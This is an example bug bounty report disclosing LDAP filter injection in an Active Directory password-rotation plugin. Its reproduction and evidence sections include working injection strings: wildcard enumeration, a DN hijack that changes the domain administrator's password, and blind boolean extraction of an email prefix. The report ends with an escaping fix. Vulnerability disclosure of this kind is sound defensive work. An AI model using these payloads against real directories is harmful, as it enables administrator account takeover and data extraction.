---
description: "Example: LDAP injection bug bounty submission with working POC"
category: Disclosure & Reporting Formats
---

**Title:** LDAP Filter Injection in AD Password Rotation Plugin allows vault record editor to take over any AD account

**VRT:** Server-Side Injection > LDAP Injection

**Severity:** P2 (High)

**Run:** `python3 poc-ldap-injection.py`
**Pass if:** every `[INJECTION CONFIRMED]` line prints

---

### Summary

An attacker with edit access to a shared credential record changes the `login` field and takes over any Active Directory account during the next password rotation. The AD rotation plugin interpolates the login field directly into the LDAP search filter without escaping: `f'(&(objectClass=user)(sAMAccountName={name}))'`. The `escape_filter_chars()` function from `ldap3` is already used elsewhere in the same codebase but was not applied here. The attached POC calls the installed rotation function and captures the LDAP filters it constructs.

### Steps to Reproduce

1. Run the POC against the installed package:
```
python3 poc-ldap-injection.py
```
2. Observe test cases calling the installed `rotate()` function.
3. Each captured filter shows unescaped LDAP metacharacters (`*`, `(`, `)`, `|`, `!`) passing through.
4. The DN_HIJACK payload resolves the administrator's DN instead of the intended user. `modify_password` then changes the administrator's password.

For end-to-end on a live AD environment:
5. Create a credential record with the AD rotation plugin, a valid AD host, and valid bind credentials.
6. Set the login field to `DOMAIN\administrator)(!(sAMAccountName=jsmith)`.
7. Run the rotation command.
8. The administrator's password is changed and stored in the vault record.

### Evidence

```
--- WILDCARD_ENUM: Wildcard injection -- enumerate ALL users ---
  Login field value:  DOMAIN\*
  CAPTURED filter:    (&(objectClass=user)(sAMAccountName=*))       <-- rotate() output
  [INJECTION CONFIRMED] Returns every user object in the domain instead of one

--- DN_HIJACK: DN hijack -- change administrator's password instead ---
  Login field value:  DOMAIN\administrator)(!(sAMAccountName=jsmith)
  CAPTURED filter:    (&(objectClass=user)(sAMAccountName=administrator)(!(sAMAccountName=jsmith)))
  [INJECTION CONFIRMED] Resolves to admin DN; modify_password changes admin password  <-- ATO

--- BLIND_BOOLEAN: Boolean-based blind extraction of email prefix ---
  Login field value:  DOMAIN\administrator)(mail=admin@*
  CAPTURED filter:    (&(objectClass=user)(sAMAccountName=administrator)(mail=admin@*))
  [INJECTION CONFIRMED] Binary oracle: result count reveals if email starts with admin@
```

All filters captured from the installed `rotate()` function.

### Attack Scenario

A contractor with shared access to an AD rotation record edits the login field to inject LDAP metacharacters. The next scheduled rotation changes the domain administrator's password instead of the intended user's. The contractor reads the credential record and logs into the domain controller with full admin privileges.

### Impact

Full Active Directory account takeover. The attacker controls which account's password is rotated and reads the new password from the credential record.

### Remediation

Apply `escape_filter_chars()` at the interpolation site:
```python
from ldap3.utils.conv import escape_filter_chars
request = f'(&(objectClass=user)(sAMAccountName={escape_filter_chars(name)}))'
```
